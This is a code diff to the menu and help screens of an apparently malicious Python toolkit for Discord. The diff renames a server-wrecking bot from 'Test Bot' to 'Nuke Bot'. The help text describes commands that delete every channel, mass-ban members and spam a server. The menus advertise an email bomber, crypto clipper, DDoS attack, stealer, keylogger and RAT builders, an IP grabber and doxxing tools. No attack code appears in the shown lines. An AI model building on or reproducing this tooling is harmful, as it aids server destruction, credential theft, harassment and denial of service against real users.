@@ -156,7 +156,7 @@ def _nbot_ui():
             
     if not token:
         print_banner()
-        print(Colorate.Horizontal(_cl["head"], "  [ TEST BOT ]\n"))
+        print(Colorate.Horizontal(_cl["head"], "  [ NUKE BOT ]\n"))
         print(Colorate.Horizontal(_cl["num"], "  Please enter Discord Bot Token:"))
         token = get_inpt("  Token: ").strip()
         if not token:
@@ -223,8 +223,8 @@ def _nbot_ui():
             
         elif cmd == "3":
             print_banner()
-            print(Colorate.Horizontal(_cl["head"], "  [ TEST BOT HELP ]\n"))
-            print(Colorate.Horizontal(_cl["txt"], "  The Test Bot runs in a separate console window and responds to Discord commands:"))
+            print(Colorate.Horizontal(_cl["head"], "  [ NUKE BOT HELP ]\n"))
+            print(Colorate.Horizontal(_cl["txt"], "  The Nuke Bot runs in a separate console window and responds to Discord commands:"))
             print(Colorate.Horizontal(_cl["num"], "  • .kill   ") + Colorate.Horizontal(_cl["txt"], "- Deletes guild channels and spams/bans (Configurable)."))
             print(Colorate.Horizontal(_cl["num"], "  • .massban") + Colorate.Horizontal(_cl["txt"], "- Bans all non-admin members in the server."))
             print(Colorate.Horizontal(_cl["num"], "  • .erase  ") + Colorate.Horizontal(_cl["txt"], "- Deletes all channels in the guild."))
@@ -241,7 +241,7 @@ def run_app():
         _cfg = get_config()
         if _cfg.get("theme", "blue").lower().startswith("modern"):
             from core.modern_ui import ModernUI as _mui
-            _d_i = ["[1] Webhook Tools", "[2] Token Tools", "[3] Nitro Generator", "[4] Server Info", "[5] Bot Invite Gen", "[6] Selfbot", "[7] Server Cloner", "[8] Test Bot"]
+            _d_i = ["[1] Webhook Tools", "[2] Token Tools", "[3] Nitro Generator", "[4] Server Info", "[5] Bot Invite Gen", "[6] Selfbot", "[7] Server Cloner", "[8] Nuke Bot"]
             _o_i = ["[10] Port Scanner", "[11] Whois Lookup", "[12] DNS Lookup", "[14] Dox Tracker", "[15] Dox Creator", "[16] Phone Lookup", "[17] Email Lookup"]
             _m_i = ["[20] Email Bomber", "[21] Crypto Clipper", "[22] Vuln Scanner", "[23] DDoS Attack", "[24] Stealer Builder", "[25] Keylogger Builder", "[26] IP Grabber", "[27] Rat Builder"]
             _g_i = ["[30] Base64 Codec", "[31] System Info", "[32] IP Pinger", "[33] Obfuscator", "[13] Metadata Scan"]
@@ -254,7 +254,7 @@ def run_app():
             _mui.render_menu(Colorate, Theme, [("GENERAL", _g_i), ("ROBLOX", _r_i), ("FAKER", _f_i), ("SYSTEM", _s_i)])
         else:
             print(Colorate.Horizontal(_cl["head"], "    [ DISCORD ]              [ OSINT ]                [ MALICIOUS ]"))
-            _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Stealer Builder"), ("[6] Selfbot", "[16] Phone Lookup", "[25] Keylogger Builder"), ("[7] Server Cloner", "[17] Email Lookup", "[26] IP Grabber"), ("[8] Test Bot", "", "[27] Rat Builder")]
+            _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Stealer Builder"), ("[6] Selfbot", "[16] Phone Lookup", "[25] Keylogger Builder"), ("[7] Server Cloner", "[17] Email Lookup", "[26] IP Grabber"), ("[8] Nuke Bot", "", "[27] Rat Builder")]
             for _r1, _r2, _r3 in _d:
                 def _f(s, w):
                     if not s: return " " * w
